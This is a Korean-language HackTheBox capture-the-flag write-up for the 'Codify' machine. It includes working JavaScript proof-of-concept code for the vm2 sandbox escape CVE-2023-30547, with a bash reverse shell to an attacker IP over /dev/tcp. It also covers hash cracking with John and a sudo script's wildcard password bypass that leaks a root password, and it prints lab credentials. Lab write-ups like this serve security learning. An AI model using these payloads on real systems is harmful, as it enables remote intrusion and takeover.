# Codify - HackTheBox
## Recon
```bash
sudo nmap -p 22,80,3000 -sC -sV -vv -oA codify 10.10.11.239
```
<img width="1106" height="358" alt="image" src="https://github.com/user-attachments/assets/66020f80-9bc8-4cf8-b3b8-0b47240f4c93" />

- SSH(22)
- HTTP(80)
- HTTP(3000)

---
## HTTP(80)
- `/etc/hosts`에 `codify.htb`추가.
<img width="1106" height="64" alt="image" src="https://github.com/user-attachments/assets/88490341-a286-4023-9ae8-9588d142f976" />

<br>
<br>

- `codify.htb`와 `10.10.11.239:3000`의 경로가 동일.
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/06fdd547-e663-48cf-9dbf-1b9225a9c6d6" />

### banner grabbing
<img width="1106" height="339" alt="image" src="https://github.com/user-attachments/assets/e0050238-bab6-491a-b8b8-d040c41dd091" />

### VM2 library 3.9.16
- `/about`경로에서 연결되는 `vm2`의 링크에서 버전 확인.
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/dfe0cd5b-1761-4b73-a159-98f2b7d726ab" />

### CVE-2023-30547
- https://nvd.nist.gov/vuln/detail/cve-2023-30547
- 예외처리에서 코드 검증이 제대로 되지 않아 샌드박스를 탈출해서 시스템 명령어를 실행할 수 있게 되는 취약점.
<img width="1100" height="482" alt="image" src="https://github.com/user-attachments/assets/0c9f3833-b0d3-43a5-9f14-bc8607258104" />

<br>
<br>

- https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244
- 예외를 발생시켜 `execSync`함수에서 시스템 명령 실행.
<img width="1100" height="646" alt="image" src="https://github.com/user-attachments/assets/3703b2f5-ad3d-4b02-90a5-ccfcd33e45d4" />

<br>
<br>

- `/editor`경로에서 ping test 시도.
```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('ping 10.10.16.4');
}
`

console.log(vm.run(code));
```
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/0b55ee91-f3c4-4cfc-9c87-151ec1addd9f" />

<br>
<br>

- ping test 성공.
<img width="1108" height="252" alt="image" src="https://github.com/user-attachments/assets/590fed81-21e1-44f8-b3ed-3e7ac8972d11" />

<br>
<br>

- 리버스 셸 실행.
```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('bash -c "bash -i >&/dev/tcp/10.10.16.4/80 0>&1"');
}
`

console.log(vm.run(code));
```
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/c0c08c28-c680-4336-8186-e51555044cba" />

<br>
<br>

- 셸 획득.
<img width="1108" height="176" alt="image" src="https://github.com/user-attachments/assets/cd977c13-df0c-4de4-b437-931cfa5c90ca" />

---
## Privesc
- `/var/www/contact`에서 `tickets.db`발견.
<img width="1108" height="232" alt="image" src="https://github.com/user-attachments/assets/b6afc795-60f5-472d-ace7-935dbd72c52b" />

<br>
<br>

- 로컬로 옮겨 `sqlite3`로 탐색하여 `joshua`의 해시 획득.
```
sqlite3 tickets.db

.headers on

.mode column

.tables

select * from users;
```
<img width="1108" height="235" alt="image" src="https://github.com/user-attachments/assets/1c4e19a4-524f-49fa-b736-dcd294587868" />

<br>
<br>

- `jhon`으로 크래킹하여 `spongebob1`획득.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1108" height="224" alt="image" src="https://github.com/user-attachments/assets/99e44489-3830-4aeb-a185-c8d970b5dd02" />

<br>
<br>

- `joshua:spongebob1`로그인.
```bash
su joshua
```
<img width="1108" height="81" alt="image" src="https://github.com/user-attachments/assets/a5783ad3-0db1-4c78-99c4-0c6a05739595" />

<br>
<br>

- `/opt/scripts/mysql-backup.sh`를 `root`권한으로 실행 가능.
<img width="1108" height="171" alt="image" src="https://github.com/user-attachments/assets/a1edbd56-0a8a-4f73-8741-1297926af416" />

<br>
<br>

- `mysql`의 비밀번호를 정확하게 검증하지 않아 wild card(*)로 우회가 가능.
<img width="1107" height="304" alt="image" src="https://github.com/user-attachments/assets/1e80a5a3-27e0-48a7-9206-541885050ac0" />

<br>
<br>

- 스크립트가 실행되는 과정을 확인하기 위해 `joshua` 셸을 하나 더 만들어 `pspy64`를 실행.
```bash
ssh joshua@10.10.11.239

/tmp/pspy64
```
<img width="1107" height="402" alt="image" src="https://github.com/user-attachments/assets/276d893f-d287-4212-8f39-dbd7cd96eb72" />

<br>
<br>

- `/opt/scripts/mysql-backup.sh`를 실행하여 *를 입력.
```bash
sudo /opt/scripts/mysql-backup.sh
```
<img width="1107" height="286" alt="image" src="https://github.com/user-attachments/assets/9846df10-d2e3-41f1-a929-81604da2e50a" />

<br>
<br>

- `mysql-backup.sh`가 실행되면서 비밀번호 노출.
<img width="1107" height="103" alt="image" src="https://github.com/user-attachments/assets/4780186b-355a-4d91-9920-db01025d0de3" />

<br>
<br>

- `root:kljh12k3jhaskjh12kjh3`로그인.
```bash
su -
```
<img width="1107" height="76" alt="image" src="https://github.com/user-attachments/assets/e36ca87b-094c-4bc1-bd77-7d3178be0444" />

---
## FLAG
- `/home/joshua/user.txt`
<img width="1107" height="213" alt="image" src="https://github.com/user-attachments/assets/7d591c82-ddcc-4ad0-90a9-9721609143cb" />

<br>
<br>

- `/root/root.txt`
<img width="1107" height="266" alt="image" src="https://github.com/user-attachments/assets/2a9248aa-9a62-4f26-9859-d9cae330ee27" />
